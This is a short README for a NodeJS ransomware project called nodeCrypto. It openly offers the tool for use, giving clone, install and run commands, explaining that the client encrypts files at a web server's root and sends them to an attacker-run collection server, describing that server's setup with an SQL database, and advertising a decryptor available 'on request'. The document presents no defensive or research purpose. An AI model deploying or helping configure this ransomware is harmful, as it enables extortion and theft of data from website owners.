# nodeCrypto
Ransomware written in NodeJs

**Install and run**  
`git clone https://github.com/atmoner/nodeCrypto.git`  
`cd nodeCrypto && npm install`  

You must edit first variable in `index.js`  
Once your configuration is complete, you can start the ransomware.  

`node index.js`

The files at the root of the web server will encrypt and send to the server.  

**Install server**  
Upload all file of server/ folder  on your webserver.
Create a sql database and import sql/nodeCrypto.sql.
Edit server/


**To Do**  

 - [x] Client (victim)
	 - [x] Encrypt webserver
	 - [x] Use private key for encryption
	 - [ ] Adapt SSL  
 - [x] Server
	 - [x] Recover data (user + encrypted file)
	 - [ ] Format the database
	 - [ ] Make GUI for webserver
 - [x] Make an executable to decrypt the files (Only on request! Contact me)
